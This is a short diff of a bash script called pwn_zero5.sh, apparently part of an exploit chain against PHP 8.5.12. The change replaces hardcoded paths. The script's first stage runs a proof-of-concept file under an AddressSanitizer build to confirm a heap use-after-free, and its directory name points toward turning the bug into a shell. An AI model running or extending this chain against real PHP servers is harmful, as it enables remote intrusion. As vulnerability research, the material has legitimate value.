@@ -20,14 +20,14 @@
 #
 # Usage: bash pwn_zero5.sh [php-binary]
 PHP=${1:-/tmp/php8512_build/plain2/sapi/cli/php}
-ART=/mnt/c/Users/andre/Downloads/php2shell-claude
+ART=$(cd "$(dirname "$0")" && pwd)
 OUT=$ART
 
 cd "$ART" || exit 1
 
 echo "=== stage 0: fresh vd6 ASAN receipt (bug present on released 8.5.12) ==="
 USE_ZEND_ALLOC=0 ASAN_OPTIONS=detect_leaks=0 timeout 120 \
-  /tmp/php8512_build/asan2/sapi/cli/php -n poc_matrix/vd6_carrier.php \
+  /tmp/php8512_build/asan2/sapi/cli/php -n vd6_carrier.php \
   > "$OUT/sr2_m0_asan.log" 2>&1
 grep -m1 "SUMMARY: AddressSanitizer: heap-use-after-free" "$OUT/sr2_m0_asan.log" \
   || { echo "[FAIL] no ASAN receipt"; exit 1; }
